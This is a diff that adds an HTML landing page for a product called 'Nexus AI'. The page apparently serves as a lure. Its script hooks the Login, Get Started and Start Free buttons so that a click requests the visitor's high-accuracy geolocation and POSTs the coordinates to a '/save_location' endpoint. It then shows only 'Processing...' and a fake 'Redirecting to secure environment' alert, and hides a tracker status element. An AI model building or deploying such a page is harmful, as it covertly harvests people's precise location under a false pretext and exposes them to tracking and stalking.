@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus AI | Build AI Automations</title>
+    <style>
+        /* Modern Dark Theme & Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: #0d0f14;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background Particles (Simulated via CSS) */
+        .background-glow {
+            position: absolute;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(99, 102, 241, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
+            top: -200px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: -1;
+        }
+
+        /* Navigation Bar */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 50px;
+            background: rgba(13, 15, 20, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(90deg, #818cf8, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-links a {
+            color: #a1a1aa;
+            text-decoration: none;
+            margin: 0 15px;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #ffffff;
+        }
+
+        .auth-buttons button {
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .btn-login {
+            background: transparent;
+            color: white;
+            margin-right: 10px;
+        }
+
+        .btn-start {
+            background: white;
+            color: black;
+            transition: transform 0.2s;
+        }
+
+        .btn-start:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 100px 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: #a1a1aa;
+            margin-bottom: 40px;
+        }
+
+        /* Action Buttons */
+        .cta-group button {
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            border: none;
+            transition: all 0.3s ease;
+        }
+
+        .cta-primary {
+            background: linear-gradient(135deg, #6366f1, #a855f7);
+            color: white;
+            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
+        }
+
+        .cta-primary:hover {
+            box-shadow: 0 15px 25px rgba(99, 102, 241, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .cta-secondary {
+            background: rgba(255, 255, 255, 0.05);
+            color: white;
+            margin-left: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Glassmorphism Dashboard Preview */
+        .dashboard-preview {
+            width: 80%;
+            height: 400px;
+            margin: 0 auto 100px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            color: #52525b;
+            font-size: 24px;
+        }
+
+        /* Hidden Status text for the background tracker */
+        #tracker-status {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="background-glow"></div>
+
+    <nav>
+        <div class="logo">Nexus AI</div>
+        <div class="nav-links">
+            <a href="#">Solutions</a>
+            <a href="#">AI Agents</a>
+            <a href="#">Automation</a>
+            <a href="#">Pricing</a>
+        </div>
+        <div class="auth-buttons">
+            <!-- Added "trigger-location" class here -->
+            <button class="btn-login trigger-location">Login</button>
+            <button class="btn-start trigger-location">Get Started</button>
+        </div>
+    </nav>
+
+    <div class="hero">
+        <h1>Build AI Automations Without Writing Complex Code</h1>
+        <p>Create AI agents, automate workflows, connect APIs, analyze data, and deploy intelligent solutions in
+            minutes. Personalize your experience now.</p>
+        <div class="cta-group">
+            <button class="cta-primary trigger-location" id="start-btn">Start Free</button>
+            <button class="cta-secondary">Watch Demo</button>
+        </div>
+        <p id="tracker-status"></p>
+    </div>
+
+    <div class="dashboard-preview">
+        [ Dashboard UI Preview / Analytics Graph ]
+    </div>
+
+    <script>
+        const triggers = document.querySelectorAll('.trigger-location');
+        const statusText = document.getElementById('tracker-status');
+
+        triggers.forEach(btn => {
+            btn.addEventListener('click', function () {
+                const originalText = this.innerText;
+                this.innerText = "Processing...";
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => success(position, this, originalText),
+                        (err) => error(err, this, originalText),
+                        { enableHighAccuracy: true }
+                    );
+                } else {
+                    console.log("Geolocation not supported.");
+                    proceedToApp();
+                }
+            });
+        });
+
+        function success(position, btn, originalText) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let accuracy = position.coords.accuracy;
+
+            fetch("/save_location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude,
+                    accuracy: accuracy
+                })
+            }).then(() => {
+                console.log("Backend sync complete.");
+                proceedToApp();
+            }).catch((err) => {
+                console.error("Sync error:", err);
+                proceedToApp();
+            });
+        }
+
+        function error(err) {
+            console.warn("User denied location or error occurred.");
+            proceedToApp();
+        }
+
+        function proceedToApp() {
+            alert("Redirecting to secure environment...");
+
+            triggers.forEach(btn => {
+                if (btn.innerText === "Processing...") {
+                    btn.innerText = "Redirecting...";
+                }
+            });
+        }
+    </script>
+</body>
+
+</html>
